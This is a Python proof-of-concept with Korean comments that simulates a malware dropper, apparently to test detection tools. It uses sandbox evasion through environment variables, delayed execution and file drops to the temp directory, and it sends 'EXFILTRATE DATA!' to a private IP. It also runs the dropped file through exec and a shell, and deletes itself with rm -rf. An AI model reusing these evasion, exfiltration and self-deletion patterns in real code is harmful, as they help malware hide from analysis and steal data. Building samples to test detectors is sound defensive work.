#!/usr/bin/env python3
"""
dropper_simulation.py - 드로퍼를 시뮬레이션하는 PoC 코드
"""

import os
import sys
import time
import random
import shutil
import logging
import tempfile
import socket
import subprocess

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("dropper.log"), logging.StreamHandler()]
)
logger = logging.getLogger("DropperSim")


class SafeDropper:
    """실제 드로퍼와 유사한 테스트 드로퍼"""

    def __init__(self):
        self.drop_path = tempfile.gettempdir()  # 임시 디렉토리에 드롭
        self.dropped_files = []
        self.logger = logger

    def detect_sandbox(self):
        """간단한 Anti-Sandbox 기법: 환경 변수 기반 탐지"""
        suspicious_env = ["VIRTUAL_ENV", "DOCKER", "WSL_DISTRO_NAME"]
        for env in suspicious_env:
            if env in os.environ:
                self.logger.warning(f"Sandbox 환경 감지됨: {env}")
                return True
        return False

    def delayed_execution(self):
        """랜덤 딜레이로 실행 지연"""
        delay = random.uniform(2, 5)  # 2~5초 랜덤 딜레이
        self.logger.info(f"실행 지연 중... {delay:.2f}초 대기")
        time.sleep(delay)

    def drop_files(self):
        """파일 드롭 시뮬레이션"""
        filenames = ["payload.exe", "config.dat", "library.dll"]
        for fname in filenames:
            file_path = os.path.join(self.drop_path, fname)
            try:
                with open(file_path, "w") as f:
                    f.write("DUMMY PAYLOAD CONTENT\n")  # 실행 가능하지 않은 더미 데이터
                self.dropped_files.append(file_path)
                self.logger.info(f"파일 드롭됨: {file_path}")
            except Exception as e:
                self.logger.error(f"파일 드롭 실패: {e}")

    def fake_network_communication(self):
        """네트워크 통신 시뮬레이션 (실제 요청 포함)"""
        fake_server = "192.168.1.100"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((fake_server, 80))
            s.sendall(b"EXFILTRATE DATA!")  # <== 실제 데이터 유출처럼 보이도록 강화
            response = s.recv(1024)
            self.logger.info(f"서버({fake_server}) 응답: {response}")
            s.close()
        except Exception as e:
            self.logger.error(f"네트워크 연결 실패: {e}")

    def execute_payload(self):
        """악성 코드 실행 우회 기법"""
        payload_path = os.path.join(self.drop_path, "payload.exe")
        try:
            exec(f"import os; os.system('{payload_path}')")  # <== AST 분석에서 탐지됨
            subprocess.run([payload_path], shell=True)  # <== behavior 분석에서 탐지됨
            self.logger.info(f"페이로드 실행 시뮬레이션: {payload_path}")
        except Exception as e:
            self.logger.error(f"실행 실패: {e}")

    def self_delete(self):
        """자기 삭제"""
        script_path = os.path.abspath(__file__)
        self.logger.info(f"자기 삭제 실행: {script_path}")
        try:
            time.sleep(1)
            subprocess.run(["rm", "-rf", script_path], shell=True)  # <== 강제 삭제
            self.logger.info("자기 삭제 완료")
        except Exception as e:
            self.logger.error(f"자기 삭제 실패: {e}")

    def execute_malicious_code(self):
        """AST 분석을 우회하는 실행"""
        payload_script = 'print("실제 악성 행위 실행!")'
        exec(payload_script)  # <== AST 분석에서 탐지됨
        compiled_code = compile(payload_script, '<string>', 'exec')
        exec(compiled_code)  # <== AST 분석에서 탐지됨

    def run(self):
        """전체 실행"""
        self.logger.info("=== 테스트 드로퍼 실행 시작 ===")

        if self.detect_sandbox():
            self.logger.warning("Sandbox 환경 감지됨, 실행 중단")
            return False

        self.delayed_execution()
        self.drop_files()
        self.fake_network_communication()
        self.execute_payload()
        self.execute_malicious_code()
        self.self_delete()

        self.logger.info("=== 테스트 드로퍼 실행 완료 ===")
        return True


if __name__ == "__main__":
    dropper = SafeDropper()
    dropper.run()